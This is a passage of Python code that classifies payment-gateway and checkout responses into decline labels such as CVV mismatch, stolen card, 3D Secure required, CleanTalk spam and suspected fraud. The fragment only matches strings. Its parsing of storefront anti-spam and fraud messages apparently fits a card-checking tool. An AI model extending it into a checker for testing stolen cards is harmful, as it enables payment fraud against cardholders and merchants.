        return 'CVV MISMATCH'
    
    if 'expired card' in search_text:
        return 'EXPIRED CARD'
    
    if 'do not honor' in search_text:
        return 'DO NOT HONOR'
    
    if 'closed card' in search_text:
        return 'CLOSED CARD'
    
    if 'call issuer' in search_text:
        return 'CALL ISSUER'
    
    if 'pick up card' in search_text or 'pickup card' in search_text:
        return 'PICK UP CARD'
    
    if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text:
        return '3D SECURE REQUIRED'
    
    if 'limit exceeded' in search_text or 'exceeds limit' in search_text:
        return 'LIMIT EXCEEDED'
    
    if 'lost or stolen' in search_text or 'stolen card' in search_text:
        return 'LOST/STOLEN CARD'
    
    if 'address verification' in search_text or 'avs' in search_text or 'postal code mismatch' in search_text:
        return 'ADDRESS MISMATCH'
    
    if 'processor declined' in search_text:
        return 'PROCESSOR DECLINED'
    
    if 'invalid card' in search_text or 'invalid card number' in search_text:
        return 'INVALID CARD'
    
    if 'no account' in search_text or 'no_account' in search_text:
        return 'NO ACCOUNT'
    
    if 'card not activated' in search_text or 'not activated' in search_text:
        return 'CARD NOT ACTIVATED'
    
    if 'cannot authorize at this time' in search_text or 'cannot authorize' in search_text:
        return 'CANNOT AUTHORIZE (POLICY)'
    
    if 'card type is not accepted' in search_text or 'card type not accepted' in search_text:
        return 'CARD TYPE NOT ACCEPTED'
    
    if 'restriction on the card' in search_text or 'issuer restriction' in search_text:
        return 'CARD RESTRICTION'
    
    if 'cleantalk suspect' in search_text or 'cleantalk' in search_text:
        if 'fraud' in search_text or 'spam' in search_text:
            return 'CLEANTALK FRAUD SUSPECT'
        else:
            return 'CLEANTALK SUSPECT'
    
    if 'gateway rejected: fraud' in search_text or 'gateway reject fraud' in search_text:
        return 'GATEWAY REJECTED FRAUD'
    
    if 'risk_threshold' in search_text or 'risk threshold' in search_text:
        return 'RISK THRESHOLD'
    
    if 'processor declined - fraud suspected' in search_text:
        return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
    
    if 'call issuer. pick up card' in search_text:
        return 'CALL ISSUER - PICK UP CARD'
    
    if 'email does not exist' in search_text or 'email doesn\'t exist' in search_text:
        return 'EMAIL DOES NOT EXIST'
    
    if 'fraud' in search_text or 'suspected fraud' in search_text:
        return 'SUSPECTED FRAUD'
    
    if 'your order was detected as spam' in search_text or 'order was detected as spam' in search_text:
        return 'ORDER DETECTED AS SPAM'
    
    if 'session has expired' in search_text:
        return 'SESSION EXPIRED - PLEASE RETRY'
    
    if 'declined' in search_text:
        return 'DECLINED'
    
    if reason and len(reason) < 50:
        return reason.upper()
    
    if clean_messages and len(clean_messages) < 100:
        return clean_messages.title()
    
    return 'DECLINED'
